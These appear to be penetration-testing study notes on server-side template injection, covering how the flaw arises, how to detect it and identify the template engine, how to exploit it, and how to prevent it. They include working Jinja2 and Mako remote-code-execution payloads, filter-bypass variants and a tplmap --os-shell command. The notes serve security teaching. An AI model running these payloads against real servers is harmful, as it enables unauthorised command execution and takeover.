# Server-Side Template Injection (SSTI)

---

# What is SSTI

Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.

Template engines are designed to generate web pages by combining fixed templates with volatile data. Server-side template injection attacks can occur when user input is **concatenated directly into a template**, **rather than passed in as data**. This allows attackers to inject arbitrary template directives in order to manipulate the template engine, often enabling them to take complete control of the server. As the name suggests, server-side template injection payloads are delivered and evaluated server-side, potentially making them much more dangerous than a typical client-side template injection.

---

# **How does SSTI arise?**

Server-side template injection vulnerabilities arise when user input is concatenated into templates rather than being passed in as data.

- This is not vulnerable to server-side template injection because the user's first name is merely passed into the template as data.
    
    ```php
    $output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name) );
    ```
    
- This is a vulnerable code because the user input will be concatenated and rendered
    
    ```php
    $output = $twig->render("Dear " . $_GET['name']);
    ```
    
- Vulnerabilities like this are sometimes caused by accident due to poor template design by people unfamiliar with the security implications. Like in the example above, you may see different components, some of which contain user input, concatenated, and embedded into a template. In some ways, this is similar to [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerabilities occurring in poorly written prepared statements.
- However, sometimes this behavior is implemented intentionally. For example, some websites deliberately allow certain privileged users, such as content editors, to edit or submit custom templates by design. This poses a considerable security risk if an attacker can compromise an account with such privileges.

---

# **Constructing a server-side template injection attack**

Identifying server-side template injection vulnerabilities and crafting a successful attack typically involves the following high-level process.

![https://portswigger.net/web-security/images/ssti-methodology-diagram.png](https://portswigger.net/web-security/images/ssti-methodology-diagram.png)

## ⇒ Detect

Server-side template injection vulnerabilities often go unnoticed not because they are complex but because they are only really apparent to auditors who are explicitly looking for them. If you are able to detect that a vulnerability is present, it can be surprisingly easy to exploit it. This is especially true in unsandboxed environments.

the simplest initial approach is to try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as `${{<%[%'"}}%\`. If an exception is raised, this indicates that the injected template syntax is potentially being interpreted by the server in some way. This is one sign that a vulnerability to server-side template injection may exist.

Server-side template injection vulnerabilities occur in two distinct contexts, each of which requires its own detection method. Regardless of the results of your fuzzing attempts, it is important to also try the following context-specific approaches. If fuzzing was inconclusive, a vulnerability may still reveal itself using one of these approaches. Even if fuzzing did suggest a template injection vulnerability, you still need to identify its context in order to exploit it.

### → **Plaintext context**

Most template languages allow you to freely input content either by using HTML tags directly or by using the template's native syntax, which will be rendered to HTML on the back-end before the HTTP response is sent. For example, in Freemarker, the line `render('Hello ' + username)` would render to something like `Hello Carlos`.

This can sometimes be exploited for [XSS](https://portswigger.net/web-security/cross-site-scripting) and is in fact often mistaken for a simple XSS vulnerability. However, by setting mathematical operations as the value of the parameter, we can test whether this is also a potential entry point for a server-side template injection attack.

For example, consider a template that contains the following vulnerable code:

```php
render('Hello ' + username)
```

During auditing, we might test for server-side template injection by requesting a URL such as:

```jsx
http://vulnerable-website.com/?username=${7*7}
```

If the resulting output contains `Hello 49`, this shows that the mathematical operation is being evaluated server-side. This is a good proof of concept for a server-side template injection vulnerability.

Note that the specific syntax required to successfully evaluate the mathematical operation will vary depending on which template engine is being used. We'll discuss this in more detail in the [Identify](Server-Side%20Template%20Injection%20(SSTI)%207f607c859c3440c3ba1ce9d3f5b915d3.md) step.

### → **Code context**

In other cases, the vulnerability is exposed by user input being placed within a template expression, as we saw earlier with our email example. This may take the form of a user-controllable variable name being placed inside a parameter, such as:

```php
greeting = getQueryParameter('greeting')
engine.render("Hello {{"+greeting+"}}", data)
```

On the website, the resulting URL would be something like:

```jsx
http://vulnerable-website.com/?greeting=data.username
```

This would be rendered in the output to `Hello Carlos`, for example.

This context is easily missed during assessment because it doesn't result in obvious XSS and is almost indistinguishable from a simple hashmap lookup. One method of testing for server-side template injection in this context is to first establish that the parameter doesn't contain a direct XSS vulnerability by injecting arbitrary HTML into the value:

```jsx
http://vulnerable-website.com/?greeting=data.username<tag>
```

In the absence of XSS, this will usually either result in a blank entry in the output (just `Hello` with no username), encoded tags, or an error message. The next step is to try and break out of the statement using common templating syntax and attempt to inject arbitrary HTML after it:

```jsx
http://vulnerable-website.com/?greeting=data.username}}<tag>
```

If this again results in an error or blank output, you have either used syntax from the wrong templating language or, if no template-style syntax appears to be valid, server-side template injection is not possible. Alternatively, if the output is rendered correctly, along with the arbitrary HTML, this is a key indication that a server-side template injection vulnerability is present:

```html
Hello Carlos<tag>
```

## ⇒ **Identify**

Once you have detected the template injection potential, the next step is to identify the template engine.

Although there are a huge number of templating languages, many of them use very similar syntax that is specifically chosen not to clash with HTML characters. As a result, it can be relatively simple to create probing payloads to test which template engine is being used.

Simply submitting invalid syntax is often enough because the resulting error message will tell you exactly what the template engine is, and sometimes even which version. For example, the invalid expression `<%=foobar%>` triggers the following response from the Ruby-based ERB engine:

```ruby
(erb):1:in `<main>': undefined local variable or method `foobar' for main:Object (NameError)
from /usr/lib/ruby/2.5.0/erb.rb:876:in `eval'
from /usr/lib/ruby/2.5.0/erb.rb:876:in `result'
from -e:4:in `<main>'
```

Otherwise, you'll need to manually test different language-specific payloads and study how they are interpreted by the template engine. you can use a decision tree similar to the following:

![https://portswigger.net/web-security/images/template-decision-tree.png](https://portswigger.net/web-security/images/template-decision-tree.png)

## ⇒ **Exploit**

### → Read

- Unless you already know the template engine inside out, reading its documentation is usually the first place to start. While this may not be the most exciting way to spend your time, it is important not to underestimate what a useful source of information the documentation can be.
- you should learn the basic template syntax to be able to write an exploit like the following python Mako:
    
    ```python
    <%
                    import os
                    x=os.popen('id').read()
                    %>
                    ${x}
    ```
    

### ->**Explore**

At this point, you might have already stumbled across a workable exploit using the documentation. If not, the next step is to explore the environment and try to discover all the objects to which you have access.

Many template engines expose a "self" or "environment" object of some kind, which acts like a namespace containing all objects, methods, and attributes that are supported by the template engine. If such an object exists, you can potentially use it to generate a list of objects that are in scope. For example, in Java-based templating languages, you can sometimes list all variables in the environment using the following injection:

```
${T(java.lang.System).getenv()}
```

This can form the basis for creating a shortlist of potentially interesting objects and methods to investigate further. Additionally, for [Burp Suite Professional](https://portswigger.net/burp/pro) users, the Intruder provides a built-in wordlist for brute-forcing variable names.

### → **Developer-supplied objects**

It is important to note that websites will contain both built-in objects provided by the template and custom, site-specific objects that have been supplied by the web developer. You should pay particular attention to these non-standard objects because they are especially likely to contain sensitive information or exploitable methods. As these objects can vary between different templates within the same website, be aware that you might need to study an object's behavior in the context of each distinct template before you find a way to exploit it.

While server-side template injection can potentially lead to remote code execution and full takeover of the server, in practice this is not always possible to achieve. However, just because you have ruled out remote code execution, that doesn't necessarily mean there is no potential for a different kind of exploit. You can still leverage server-side template injection vulnerabilities for other high-severity exploits, such as [directory traversal](https://portswigger.net/web-security/file-path-traversal), to gain access to sensitive data.

---

# Automation

## ⇒ tplmap

### → install `tplmap`

```bash
git clone https://github.com/epinna/tplmap.git
cd tplmap
pip install virtualenv
virtualenv -p python2 venv
source venv/bin/activate
pip install -r requirements.txt
# ./tplmap.py -u "http://$ip:$port" -d name=john
```

### → os-shell

```bash
./tplmap.py -u "http://$ip:$port" -d name=john --os-shell
```

- [SSTI payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
    
    [PayloadsAllTheThings/Server Side Template Injection at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
    

---

# **SSTI Python Exploit**

## ⇒ Using `String`

Below is a small dictionary from [fatalerrors.org](https://www.fatalerrors.org/a/0dhx1Dk.html) to refer to when going over the Jinja2 payload development part of this section:

| No. | Methods | Description |
| --- | --- | --- |
| 1. | __class__ | Returns the object (class) to which the type belongs |
| 2. | __mro__ | Returns a tuple containing the base class inherited by the object. Methods are parsed in the order of tuples. |
| 3. | __subclasses__ | Each new class retains references to subclasses, and this method returns a list of references that are still available in the class |
| 4. | __builtins__ | Returns the builtin methods included in a function |
| 5. | __globals__ | A reference to a dictionary that contains global variables for a function |
| 6. | __base__ | Returns the base class inherited by the object <-- (__ base__ and __ mro__ are used to find the base class) |
| 7. | __init__ | Class initialization method |

![Screenshot_20221128_131916.png](Server-Side%20Template%20Injection%20(SSTI)%207f607c859c3440c3ba1ce9d3f5b915d3/Screenshot_20221128_131916.png)

```bash
>>> s.__class__.**__base__**.__subclasses__()

[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>,
 <SNIP>
 
 
>>> s.__class__.**mro()[1]**.__subclasses__()

[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>,
 <SNIP>
```

```python
def searchfunc(name):
	x = 'str'.__class__.mro()[1].__subclasses__()
	for i in range(len(x)):
		fn = x[i].__name__
		if fn.find(name) > -1:
			print(i, fn)

searchfunc('warning')
```

```python
{{ ''.__class__.__base__.__subclasses__()[146].__init__.__globals__['sys'].modules['os'].popen('id').read() }}
```

```python
{{ ''.__class__.__mro__[1].__subclasses__()[147]()._module.__builtins__['__import__']('os').system('id') }}
```

## Bypass Filters

### Bypass blocked`.`

```python
{{ ''.__class__.__mro__[1].__subclasses__()[147]()._module.__builtins__['__import__']('os').system('id') }}
```

```bash
{{ ''['__class__']['__mro__'][1]['__subclasses__'][index_of_catch_warnings]['__init__']['__globals__']['sys']['modules']['os']['popen']('id')['read']() }}
```

### Bypass blocked strings using unicode

```python
{{''['\U0000005F\U0000005F\U00000063\U0000006c\U00000061\U00000073\U00000073\U0000005F\U0000005F']['\U0000005f\U0000005f\U0000006d\U00000072\U0000006f\U0000005f\U0000005f'][1]['\U0000005f\U0000005f\U00000073\U00000075\U00000062\U00000063\U0000006c\U00000061\U00000073\U00000073\U00000065\U00000073\U0000005f\U0000005f']()[207]['\U0000005f\U0000005f\U00000069\U0000006e\U00000069\U00000074\U0000005f\U0000005f']['\U0000005f\U0000005f\U00000067\U0000006c\U0000006f\U00000062\U00000061\U0000006c\U00000073\U0000005f\U0000005f']['sys']}}
```

The application returns `0` in its response. This is the return of the value of the command we just executed. `0` indicates that the command was executed without errors.

## ⇒ Using `Flask.url_for`

```python
url_for.__globals__.os.popen("id").read() 
# url_for is a popular flask method whose file imports os module (helpers.py)
```

---

```python
{{request.application.__globals__.__builtins__.__import__('os')['popen']('ls')['read']()}}
```

```python
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('ls')['read']()}}
```

---

# **How to prevent server-side template injection vulnerabilities**

The best way to prevent server-side template injection is to not allow any users to modify or submit new templates. However, this is sometimes unavoidable due to business requirements.

One of the simplest ways to avoid introducing server-side template injection vulnerabilities is to always use a "logic-less" template engine, such as Mustache, unless absolutely necessary. Separating the logic from presentation as much as possible can greatly reduce your exposure to the most dangerous template-based attacks.

Another measure is to only execute users' code in a sandboxed environment where potentially dangerous modules and functions have been removed altogether. Unfortunately, sandboxing untrusted code is inherently difficult and prone to bypasses.

Finally, another complementary approach is to accept that arbitrary code execution is all but inevitable and apply your own sandboxing by deploying your template environment in a locked-down Docker container, for example.

---

The most difficult way to identify SSTI is to fuzz the template by injecting combinations of special characters used in template expressions. These characters include `${{<%[%'"}}%\`. If an exception is caused, this means that we have some control over what the server interprets in terms of template expressions.

We can use tools such as [Tplmap](https://github.com/epinna/tplmap) or J2EE Scan (Burp Pro) to automatically test for SSTI vulnerabilities or create a payload list to use with Burp Intruder or ZAP.

The diagram below from [PortsSwigger](https://portswigger.net/research/server-side-template-injection) can help us identify if we are dealing with an SSTI vulnerability and also identify the underlying template engine.

![https://academy.hackthebox.com/storage/modules/145/img/ssti_diagram.png](https://academy.hackthebox.com/storage/modules/145/img/ssti_diagram.png)

> That being said, the fact that {{7*'7'}} was evaluated with the application returning 7777777 means that Jinja2 is being utilized on the backend.
> 

In addition to the above diagram, we can try the following approaches to recognize the technology we are dealing with:

- Check verbose errors for technology names. Sometimes just copying the error in Google search can provide us with a straight answer regarding the underlying technology used
- Check for extensions. For example, .jsp extensions are associated with Java. When dealing with Java, we may be facing an expression language/OGNL injection vulnerability instead of traditional SSTI
- Send expressions with unclosed curly brackets to see if verbose errors are generated. Do not try this approach on production systems, as you may crash the webserver.

---

- if we have SSTI and the payload length is limited, we send the payload in another parameter and call it using `request.args.parameter_name`

```html
site.com/?payload=verylongpayload&message={{request.args.payload}}
site.com/?payload=<tag>html in here</tag>&message={{request.args.payload|safe}}
```

`safe` to prevent HTML escaping so we can inject HTML